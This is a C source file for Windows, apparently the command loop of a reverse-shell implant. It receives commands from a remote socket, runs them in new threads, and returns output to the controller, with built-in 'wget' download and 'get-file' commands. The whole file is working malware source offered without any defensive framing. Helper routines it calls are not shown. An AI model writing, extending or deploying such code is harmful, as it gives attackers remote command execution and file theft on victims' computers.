#include "main.h"

int is_command(char * cmd)
{
	if(my_strcmp(cmd, "exit\n"))
		return 1;
	if(cmd[0] == 'c' && cmd[1] == 'd' && cmd[2] == ' ')
		return 1;
	if(cmd[0] == 'w' && cmd[1] == 'g' && cmd[2] == 'e' && cmd[3] == 't' && cmd[4] == ' ')
		return 1;
	if(cmd[0] == 'g' && cmd[1] == 'e' && cmd[2] == 't' && cmd[3] == '-' && cmd[4] == 'f' && cmd[5] == 'i' && cmd[6] == 'l' && cmd[7] == 'e' && cmd[8] == ' ')
		return 1;
	return 0;
}

DWORD WINAPI command_handler(void *inf)
{
	struct main_struct * m_s = (struct main_struct*)inf;

	if(is_command(m_s->cmd) == 1) {
		process_command(m_s);
	} else {
		if(exe(m_s) != 0) {
			m_s->buf = malloc(1024 * sizeof(char));
			sprintf(m_s->buf, "Error: type exit to reboot the connection");
		}
		if(strlen(m_s->buf) < 2) {
			sprintf(m_s->buf, "....");
		}
		sender(m_s->s, m_s->buf, strlen(m_s->buf), &m_s->cn);
	}
	free(m_s->buf);
	return 0;
}

int reverse_shell(struct main_struct *m_s)
{
	HANDLE command_thread;

	while(m_s->cn != SOCKET_ERROR) {
		m_s->cmd = malloc(1024 * sizeof(char));
		receiver(m_s->s, m_s->cmd, 1024, &m_s->cn);
		#ifdef _DEBUG
			debug(m_s);
		#endif
		command_thread = CreateThread(NULL, 0, command_handler, (void *)m_s, 0, NULL);
		if (command_thread) {
			sleep(1);
		}
	}
	return 0;
}
